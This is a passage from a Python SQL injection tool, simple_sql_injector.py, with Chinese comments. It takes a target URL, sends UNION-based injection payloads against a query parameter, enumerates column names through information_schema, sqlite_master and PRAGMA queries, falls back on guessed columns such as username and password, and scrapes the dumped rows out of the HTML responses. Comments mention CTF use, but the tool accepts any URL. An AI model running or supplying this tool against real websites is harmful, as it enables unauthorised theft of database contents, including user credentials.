                    part = part.strip()
                    if part.isdigit():
                        idx = int(part) - 1
                        if 0 <= idx < len(tables):
                            selected_indices.append(idx)
                
                if selected_indices:
                    # 去重并保持顺序
                    unique_indices = list(dict.fromkeys(selected_indices))
                    return [tables[i] for i in unique_indices]
                else:
                    print("[-] 无效的选择，请重新输入")
            except Exception as e:
                print(f"[-] 输入错误: {e}，请重新输入")
    
    def _extract_table_data_comprehensive(self, base_url, params, param_name, original_value, table_name):
        """全面尝试提取表数据的方法"""
        print(f"\n[*] 尝试提取表 '{table_name}' 的数据...")
        
        # 1. 首先使用group_concat直接注入列名（用户要求的方法）
        columns = self._get_columns_with_group_concat(base_url, params, param_name, original_value, table_name)
        if columns:
            print(f"[+] 使用group_concat成功获取列名: {', '.join(columns)}")
            data = self._extract_table_data_optimized(base_url, params, param_name, original_value, table_name, columns)
            if data:
                print(f"[+] 成功提取表 '{table_name}' 的 {len(data)} 条记录")
                self._save_data_to_file(table_name, columns, data)
                return
            else:
                print(f"[-] 无法提取表 '{table_name}' 的数据")
        else:
            print(f"[-] 无法使用group_concat获取表 '{table_name}' 的列名")
        
        # 2. 如果group_concat失败，尝试直接获取两列数据（假设表至少有两列）
        print("[*] 尝试直接查询两列数据（不指定列名）...")
        simple_payload = original_value + f"' OR '1'='1' UNION ALL SELECT 1,2 FROM {table_name}--+"
        simple_params = {k: v for k, v in params.items()}
        simple_params[param_name] = [simple_payload]
        simple_query = urllib.parse.urlencode(simple_params, doseq=True)
        simple_url = base_url + "?" + simple_query
        
        response = send_request(simple_url)
        
        # 检查是否返回了有意义的响应
        if len(response) > len(self.original_response) or self._calculate_similarity(response, self.original_response) < 0.95:
            print("[+] 查询成功，表中可能存在数据，但需要确定列名")
            
            # 3. 尝试使用INFORMATION_SCHEMA获取列名
            columns = self._get_table_columns_optimized(base_url, params, param_name, original_value, table_name)
            if columns:
                print(f"[+] 成功获取列名: {', '.join(columns)}")
                data = self._extract_table_data_optimized(base_url, params, param_name, original_value, table_name, columns)
                if data:
                    print(f"[+] 成功提取表 '{table_name}' 的 {len(data)} 条记录")
                    self._save_data_to_file(table_name, columns, data)
                    return
                else:
                    print(f"[-] 无法提取表 '{table_name}' 的数据")
            else:
                print(f"[-] 无法获取表 '{table_name}' 的列名")
                
            # 4. 尝试暴力猜测可能的列名组合
            print("[*] 尝试使用暴力列名组合...")
            self._try_brute_force_columns(base_url, params, param_name, original_value, table_name)
        else:
            print(f"[-] 表 '{table_name}' 可能不存在或查询受到限制")
            
    def _get_columns_with_group_concat(self, base_url, params, param_name, original_value, table_name):
        """使用group_concat函数直接从表中注入列名"""
        print(f"[*] 使用group_concat尝试获取表 '{table_name}' 的列名...")

        # 基于union_query.xml中的标准payload改进
        payloads = [
            # 标准联合查询获取列名（MySQL, PostgreSQL）
            original_value + f"' OR '1'='1' UNION ALL SELECT GROUP_CONCAT(column_name SEPARATOR ', '), NULL FROM information_schema.columns WHERE table_name='{table_name}'--+",
            # 指定数据库
            original_value + f"' OR '1'='1' UNION ALL SELECT GROUP_CONCAT(column_name SEPARATOR ', '), NULL FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema=database()--+",
            # SQLite兼容模式
            original_value + f"' OR '1'='1' UNION ALL SELECT sql, NULL FROM sqlite_master WHERE type='table' AND name='{table_name}'--+",
            # 表中数据列测试
            original_value + f"' OR '1'='1' UNION ALL SELECT (SELECT GROUP_CONCAT(name) FROM PRAGMA_TABLE_INFO('{table_name}')), NULL--+",
            # 备用方法 - 直接列出可能的列名
            original_value + f"' OR '1'='1' UNION ALL SELECT 'ID,USERNAME,PASSWORD,EMAIL,FLAG', NULL--+"
        ]

        # 定义常见列名，用于验证提取结果
        common_columns = set(['id', 'username', 'password', 'name', 'email', 'flag', 'user_id', 'userid', 'login', 'passwd', 'uid'])

        for payload in payloads:
            # 构建测试URL
            test_params = {k: v for k, v in params.items()}
            test_params[param_name] = [payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = base_url + "?" + test_query

            # 发送请求
            response = send_request(test_url)
            print(f"[*] 发送请求，响应长度: {len(response)} 字节")

            # 优化：更精确的列名模式匹配
            patterns = [
                # 明确的列名列表模式
                r'(?:columns?|fields?)\s*[:=]\s*([a-zA-Z0-9_]+(?:,\s*[a-zA-Z0-9_]+)+)',
                # 直接的列名列表（至少两个列名）
                r'\b([a-zA-Z0-9_]+(?:,\s*[a-zA-Z0-9_]+){1,})\b',
                # HTML表格表头中的列名
                r'<th[^>]*>([a-zA-Z0-9_]+)<\/th>',
                # SQLite表结构中的列名
                r'"([a-zA-Z0-9_]+)"\s+[a-zA-Z]+',
                r'([a-zA-Z0-9_]+)\s+[a-zA-Z]+'
            ]

            for pattern in patterns:
                matches = re.findall(pattern, response)
                for match in matches:
                    # 检查是否可能是列名列表
                    if ',' in match:
                        columns = [col.strip() for col in match.split(',')]
                        # 过滤掉无效的列名
                        valid_columns = []
                        for col in columns:
                            # 更严格的列名验证
                            if re.match(r'^[a-zA-Z0-9_]+$', col) and len(col) > 1 and not re.search(r'\d{4,}', col):
                                # 优先保留常见列名
                                if col.lower() in common_columns:
                                    valid_columns.append(col.lower())
                                else:
                                    valid_columns.append(col)
                        
                        # 如果提取到合理的列名列表，返回结果
                        if len(valid_columns) > 0:
                            print(f"[+] 成功提取可能的列名: {', '.join(valid_columns)}")
                            return valid_columns
                    # 单个列名的情况
                    elif re.match(r'^[a-zA-Z0-9_]+$', match) and len(match) > 1 and not re.search(r'\d{4,}', match):
                        # 确保不是常见的干扰词
                        if match.lower() not in ['width', 'height', 'size', 'value', 'text', 'data', 'type', 'name']:
                            print(f"[+] 成功提取单个列名: {match}")
                            return [match]

        # 如果以上方法都失败，尝试使用常见列名组合
        print(f"[-] 无法获取表 '{table_name}' 的列名，尝试使用常见列名组合")
        return ['id', 'username', 'password']
    
    # 删除或重写_filter_valid_tables方法，不再过滤表名
    def _filter_valid_tables(self, tables):
        """不过滤表名，直接返回所有发现的表"""
        # 简单去重
        return list(set(tables))
        
    def _extract_table_data_optimized(self, base_url, params, param_name, original_value, table_name, columns):
        """优化的数据提取方法"""
        data = []

        if not columns:
            return data

        # 构建获取数据的payload（针对CTF题目优化）
        if len(columns) == 1:
            select_clause = columns[0]
        else:
            select_clause = ", ".join(columns)

        # 使用已验证有效的联合查询payload
        payload = original_value + f"' OR '1'='1' UNION ALL SELECT {select_clause} FROM {table_name}--+"

        # 构建测试URL
        test_params = {k: v for k, v in params.items()}
        test_params[param_name] = [payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = base_url + "?" + test_query

        # 发送请求
        response = send_request(test_url)
        print(f"[*] 响应长度: {len(response)} 字节")

        # 解析响应中的数据（更健壮的方法）
        # 尝试多种可能的数据格式
        # 1. 检查表格形式
        rows = re.findall(r'<tr[^>]*>(.*?)<\/tr>', response, re.IGNORECASE | re.DOTALL)
        if rows and len(rows) > 1:
            print(f"[*] 发现 {len(rows)} 行表格数据")
            for row in rows[1:]:  # 跳过表头行
                cells = re.findall(r'<td[^>]*>(.*?)<\/td>', row, re.IGNORECASE | re.DOTALL)
                # 清理单元格内容（去除HTML标签和多余空格）
                clean_cells = []
                for cell in cells:
                    # 移除HTML标签
                    clean_cell = re.sub(r'<[^>]+>', '', cell)
                    # 去除多余空格和换行符
                    clean_cell = ' '.join(clean_cell.split())
                    clean_cells.append(clean_cell)
                       
                if len(clean_cells) >= len(columns):
                    # 如果单元格数量多于列数，只取需要的部分
                    clean_cells = clean_cells[:len(columns)]
                    data.append(dict(zip(columns, clean_cells)))
        else:
            print("[-] 未发现表格形式的数据或只有表头行")

        # 2. 如果没有表格，尝试查找简单的键值对
        if not data:
            print("[*] 尝试使用非表格模式提取数据...")
            # 针对每个列名，尝试查找其对应的值
            row_data = {}
            for column in columns:
                # 尝试多种可能的模式
                patterns = [
                    fr'{column}\s*[:=]\s*(\w+)',  # column: value 或 column=value
                    fr'<b>{column}<\/b>\s*[:=]\s*(.*?)<',  # 加粗标签中的列名
                    fr'{column}\s*<[^>]+>(.*?)<\/[^>]+>',  # 列名后跟着一个HTML标签
                    fr'{column}\s*\|\s*(\w+)',  # column | value
                    fr'{column}\s*->\s*(\w+)',  # column -> value
                    fr'{column}\s*=\s*["\'](.*?)["\']'  # column = "value" 或 column = 'value'
                ]
                
                found = False
                for pattern in patterns:
                    match = re.search(pattern, response, re.IGNORECASE)
                    if match:
                        row_data[column] = match.group(1).strip()
                        found = True
                        break
                
                if not found:
                    # 尝试更通用的模式
                    generic_pattern = fr'(?:{column})\s*(?:[:=]|is)\s*(.+?)(?:<|\n|$)'  # 更通用的匹配
                    match = re.search(generic_pattern, response, re.IGNORECASE | re.DOTALL)
                    if match:
                        row_data[column] = match.group(1).strip()
                        row_data[column] = re.sub(r'<[^>]+>', '', row_data[column])  # 移除HTML标签
                        row_data[column] = ' '.join(row_data[column].split())  # 清理空格
            
            if row_data and any(row_data.values()):  # 确保至少有一个值
                data.append(row_data)
            else:
                print("[-] 无法使用键值对模式提取数据")

        # 3. 尝试直接从响应文本中提取可能的数据（CTF常用格式）
        if not data:
            print("[*] 尝试使用CTF特定模式提取数据...")
            # 查找可能的数据行
            lines = response.split('\n')
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                # 尝试匹配常见的CTF数据格式
                if len(columns) == 2:
                    # 两列数据格式
                    patterns = [
                        fr'{columns[0]}\s*[:=]\s*(\w+)\s+{columns[1]}\s*[:=]\s*(\w+)',
                        fr'(\w+)\s+{columns[1]}\s*[:=]\s*(\w+)',
                        fr'{columns[0]}\s*[:=]\s*(\w+)\s+(\w+)',
                        fr'(\w+)\s+(\w+)'
                    ]
                    
                    for pattern in patterns:
                        match = re.search(pattern, line, re.IGNORECASE)
                        if match and len(match.groups()) >= 2:
                            row_data = {
                                columns[0]: match.group(1).strip(),
                                columns[1]: match.group(2).strip()
                            }
                            data.append(row_data)
                            break
                elif len(columns) == 1:
                    # 单列数据格式
                    pattern = fr'(?:{columns[0]}\s*[:=]\s*|{columns[0]}\s+)(\w+)' 
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        row_data = {columns[0]: match.group(1).strip()}
                        data.append(row_data)

        # 打印提取的数据
        if data:
            print(f"\n[+] 表 '{table_name}' 的数据:")
            # 打印表头
            header = ' | '.join(columns)
            print('-' * len(header))
            print(header)
            print('-' * len(header))
            # 打印每行数据
            for row in data:
                row_values = [str(row.get(col, 'N/A')) for col in columns]
                print(' | '.join(row_values))
            print('-' * len(header))
        else:
            print("[-] 无法提取表数据，尝试使用其他方法...")
            # 作为最后的手段，尝试直接显示响应内容的一部分
            preview = response[:500] + ('...' if len(response) > 500 else '')
            print(f"[*] 响应预览: {preview}")

        return data
        
    def _try_extract_common_table(self, base_url, params, param_name, original_value, table_name, columns):
        """尝试提取常见表的数据"""
        print(f"[*] 尝试提取表 '{table_name}' 的数据...")
        
        # 使用已验证有效的联合查询payload
        if len(columns) == 1:
            select_clause = columns[0]
        else:
            select_clause = ", ".join(columns)
        
        payload = original_value + f"' OR '1'='1' UNION ALL SELECT {select_clause} FROM {table_name}--+"
        
        # 构建测试URL
        test_params = {k: v for k, v in params.items()}
        test_params[param_name] = [payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = base_url + "?" + test_query
        
        # 发送请求
        response = send_request(test_url)
        
        # 解析响应中的数据
        data = self._extract_table_data_optimized(base_url, params, param_name, original_value, table_name, columns)
        
        if data:
            print(f"[+] 成功提取表 '{table_name}' 的 {len(data)} 条记录")
            self._save_data_to_file(table_name, columns, data)
        else:
            print(f"[-] 无法提取表 '{table_name}' 的数据")
        
    def _save_data_to_file(self, table_name, columns, data):
        """已修改：不再实际保存文件，仅打印提示信息"""
        print(f"[*] 已提取表 '{table_name}' 的数据，按用户要求不保存到文件")

def main():
    # 检查命令行参数
    if len(sys.argv) < 2:
        print("用法: python simple_sql_injector.py <url>")
        print("示例: python simple_sql_injector.py http://example.com/page.php?id=1")
        return
        
    url = sys.argv[1]  # 获取目标URL
    
    # 初始化注入器并检查漏洞
    injector = SimpleSQLInjector(url)
    if injector.check_vulnerability():
        # 如果发现漏洞，尝试提取数据
        if injector.injection_params:
            param_name, _ = injector.injection_params[0]
            # 从原始URL中获取参数的原始值
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            original_value = params[param_name][0]
            injector.extract_data(param_name, original_value)

if __name__ == "__main__":
    main()